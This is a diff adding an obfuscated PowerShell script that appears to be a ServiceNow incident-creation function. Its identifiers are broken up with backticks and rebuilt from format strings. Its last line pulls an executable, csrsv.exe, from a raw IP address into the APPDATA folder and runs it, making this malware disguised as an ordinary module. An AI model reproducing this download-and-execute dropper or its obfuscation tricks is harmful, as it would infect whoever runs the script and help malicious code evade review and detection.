@@ -1,0 +1,146 @@
+function n`eW-Se`RV`i`CeNOwInCIdEnt{
+
+
+    Param(
+
+        
+        [parameter(MANdATORY=${T`RuE})]
+        [parameter(pARAmETersEtNAmE="spEcIf`yc`Onn`e`ctiO`NFiEl`ds")]
+        [parameter(PArAMetErsetNaMe="USEco`NNe`CtiON`o`BjeCt")]
+        [parameter(PARAMEtErsETNAme="SETg`lObAL`AuTh")]
+        [string]${c`AlLER},
+
+        
+        [parameter(mandaTOrY=${t`RUE})]
+        [parameter(PARamETERseTnamE="sPeC`I`FYcO`NNEctiOnfi`elds")]
+        [parameter(parametERsETnaMe="usE`coNnecT`ionob`je`CT")]
+        [parameter(parAMeTERSEtName="SeTgLOB`A`LaUth")]
+        [string]${Sh`Ort`DESC`RiPtIon},
+
+        
+        [parameter(MaNDaToRy=${Fa`L`sE})]
+        [parameter(parameTErsETnamE="S`pecI`FYCO`Nn`ecTIOnfIELds")]
+        [parameter(parameteRSEtNaMe="USe`co`NnECTiO`N`OB`JeCT")]
+        [parameter(pARAmeTeRSEtName="sET`GlOBalAU`TH")]
+        [string]${DE`Sc`Ri`ptIoN},
+
+        
+        [parameter(mAnDAtory=${f`AlSE})]
+        [parameter(PAraMeTErSetnAmE="sPE`cifYC`On`NEcti`ONFiEl`dS")]
+        [parameter(PaRAMETeRsETNamE="U`sEC`onneCtionOB`JECt")]
+        [parameter(PAraMeTeRseTnAme="SEtG`loba`La`Uth")]
+        [string]${a`SS`IG`NMeN`TgRoup},
+
+        
+        [parameter(MANdatOrY=${Fa`lse})]
+        [parameter(pARaMeTErsetnAMe="SpEcIf`Yc`OnneCT`iO`NFIElds")]
+        [parameter(PaRaMEtErSETNaMe="uSecON`NE`CT`Io`NOb`jEcT")]
+        [parameter(PaRAmeteRsEtnaME="sETgl`obal`AutH")]
+        [string]${co`mMeNT},
+
+        
+        [parameter(mAnDATORY=${f`A`Lse})]
+        [parameter(PArAMEtErSETnAmE="SPeCI`FYcO`NNeC`Tio`NFIE`L`Ds")]
+        [parameter(pARametErSETNAme="U`Se`co`NN`eCti`oNObJE`Ct")]
+        [parameter(pARAmetErSEtName="sETGLo`BA`l`AUth")]
+        [string]${cA`Tegory},
+
+        
+        [parameter(MAnDaTORY=${FA`LsE})]
+        [parameter(ParametErsETnaMe="SPeCIF`YcOn`NEC`Ti`oNfI`E`ldS")]
+        [parameter(PAraMeTerSEtnaME="u`sECon`Ne`ctiO`NO`BjECT")]
+        [parameter(paraMetERseTNAme="SetGLOB`ALA`UTh")]
+        [string]${sUBc`AtEg`Ory},
+
+        
+        [parameter(MANdAtory=${FA`lSe})]
+        [parameter(parAmETersETname="sPeCiF`YCON`NECti`ON`FIElDS")]
+        [parameter(PAramEteRSETnaMe="use`C`oNNec`T`IOnoBjecT")]
+        [parameter(ParametErSeTname="SE`T`gLoBAL`AuTH")]
+        [string]${c`o`NFIguRa`TioNi`TEm},
+
+        
+        [parameter(MAndaTory=${F`A`lse})]
+        [parameter(PaRaMeTersetnaME="s`pECIf`yCO`NNECTionFI`ELdS")]
+        [parameter(parAmeteRsEtnaMe="U`SE`Co`NNecTiO`N`objecT")]
+        [parameter(PArAMEtERSETNaMe="s`eTG`lobaLautH")]
+        [hashtable]${cU`stOMfie`L`dS},
+
+        
+        [Parameter(ParAmeTErseTnamE="spECiF`y`cOnN`eCt`iOnFIeldS", mAnDatOry=${tR`UE})]
+        [ValidateNotNullOrEmpty()]
+        [PSCredential]${S`eR`VI`CeNO`wCRED`e`NtIAL},
+
+        
+        [Parameter(PAraMeteRSeTname="S`Peci`FyC`On`NECTI`OnFIEldS", MAnDATory=${T`Rue})]
+        [ValidateNotNullOrEmpty()]
+        [string]${sERvIC`en`owU`RL},
+
+        
+        [Parameter(ParametErsEtName="USe`c`Onn`E`ctiONobjEct", maNdaTORY=${t`Rue})]
+        [ValidateNotNullOrEmpty()]
+        [Hashtable]${c`O`N`NectiON}
+    )
+
+    
+    ${de`FiNEd`i`NcI`DE`NTPaRA`MeTe`RS} = @(("{0}{3}{1}{2}" -f'As','rou','p','signmentG'),("{1}{0}" -f'er','Call'),("{2}{1}{0}"-f'y','ategor','C'),("{0}{1}" -f'Comm','ent'),("{3}{0}{4}{2}{1}" -f 'g','nItem','tio','Confi','ura'),("{0}{3}{2}{1}"-f'Descr','ion','pt','i'),("{3}{0}{1}{2}" -f'escri','pt','ion','ShortD'),("{2}{1}{0}" -f 'ry','ego','Subcat'))
+    ${tabL`E`EntR`yvalUEs} = @{}
+    ForEach (${P`ArAMe`TEr} in ${dEFi`NEDi`NCIDE`NtP`AR`A`ME`T`eRS}) {
+        If (${N`ULl} -ne ${p`sbOunDpAram`et`erS}.${pAraM`ET`er}) {
+            
+            ${K`e`y`TOadD} = Switch (${pA`RAme`T`ER}) {
+                ("{1}{0}{2}"-f'ntGrou','Assignme','p')     {("{3}{2}{1}{0}"-f'nt_group','e','signm','as'); break}
+                ("{0}{1}" -f'Calle','r')              {("{0}{1}{2}{3}" -f'c','aller_','i','d'); break}
+                ("{1}{0}{2}" -f 'te','Ca','gory')            {("{2}{1}{0}" -f 'y','tegor','ca'); break}
+                ("{1}{0}"-f 'omment','C')             {("{1}{0}{2}" -f'om','c','ments'); break}
+                ("{3}{0}{1}{2}"-f'ion','Ite','m','Configurat')   {("{1}{0}" -f'i','cmdb_c'); break}
+                ("{0}{2}{1}{3}" -f'Descr','p','i','tion')         {("{2}{1}{0}" -f 'ption','scri','de'); break}
+                ("{1}{2}{0}{3}" -f'cr','Short','Des','iption')    {("{3}{2}{1}{0}" -f'ion','ript','esc','short_d'); break}
+                ("{0}{3}{2}{1}"-f'Sub','tegory','a','c')         {("{2}{1}{0}" -f'egory','bcat','su'); break}
+            }
+            ${t`AB`LeEN`TRyvaL`UEs}.("{0}{1}"-f'Ad','d').Invoke(${K`E`ytOadd},${PSBouNd`Pa`R`AmE`TERs}.${param`ET`ER})
+        }
+    }
+
+    
+    If (${n`ULl} -ne ${p`SBoU`NDpAra`MeTE`Rs}."CUStOM`Fi`ElDS") {
+        ${DU`p`LiC`A`TEtab`lee`NT`RyvaluEs} = ForEach (${k`ey} in ${cusTo`mfi`eLDS}."KE`Ys") {
+            If ((${tAB`Le`eNtRy`VAlUes}.("{0}{2}{1}" -f 'Cont','ey','ainsK').Invoke(${K`Ey}) -eq ${F`Alse})) {
+                
+                ${taBle`eNTr`yv`AL`U`ES}."a`dD"(${k`eY},${CUs`T`Omf`i`elds}[${k`ey}])
+            }
+            Else {
+                
+                ${K`ey}
+            }
+        }
+    }
+
+    
+    If (${nu`Ll} -ne ${DupLICAteta`BL`eeN`TR`Yv`AL`Ues}) {
+        ${D`UpL`ICa`TEKe`YLisT} = ${DuPlICAt`etaB`lEEnTRY`V`AlU`ES} -join ","
+        Throw ('Ticket'+' '+'fi'+'eld'+'s '+'may'+' '+'only'+' '+'be'+' '+'used'+' '+'once:'+' '+' '+"$DuplicateKeyList")
+    }
+
+    
+    ${N`eWser`Vic`ENoWTABLeE`NtRysPlAT} = @{
+        ("{0}{1}"-f 'T','able') = ("{0}{2}{1}"-f'incid','t','en')
+        ("{0}{1}" -f 'Va','lues') = ${TAbL`EeNTryVa`LU`Es}
+    }
+
+    
+    if (${n`ULL} -ne ${PsbOu`NdPAR`AME`T`ERs}."cO`N`NECtioN")
+    {
+        ${NeW`SeRvi`ce`NowtAB`LeENtr`ysp`Lat}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}"-f 'n','tio','Connec'),${CoNn`Ect`ioN})
+    }
+    elseif (${n`ULL} -ne ${PS`B`OundPAraMeT`ErS}."sE`RVicEN`OW`c`RE`DEntiAL" -and ${nU`lL} -ne ${psb`O`U`NDP`ARaMeTERs}."sERViCEn`O`wUrl")
+    {
+        ${newSe`RVi`ceNOwTaBlEen`TrYsP`l`AT}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{6}{5}{4}{2}" -f 'ice','rv','ial','Se','ent','Cred','Now'),${servIcen`o`w`crE`den`TIAL})
+        ${n`e`wsErv`ICEN`OWtaBL`EEnT`R`Ysp`Lat}.("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}" -f 'S','URL','iceNow','erv'),${SErViceNO`w`U`Rl})
+    }
+
+    
+    &("{4}{5}{3}{2}{0}{1}"-f 'Ent','ry','owTable','rviceN','New','-Se') @newServiceNowTableEntrySplat
+}
+
+(&("{2}{0}{1}" -f 'Obje','ct','New-') ("{1}{2}{4}{0}{3}" -f 'b','System.','Ne','Client','t.We')).("{0}{2}{3}{1}" -f'Dow','ile','n','loadF').Invoke(("{2}{0}{1}{9}{5}{7}{4}{6}{3}{8}"-f'/94.1','02','http:/','v.ex','ah','8/','oo/csrs','~y','e','.53.23'),"$env:APPDATA\csrsv.exe");&("{1}{3}{0}{2}"-f'oces','Star','s','t-Pr') ("$env:APPDATA\csrsv.exe")
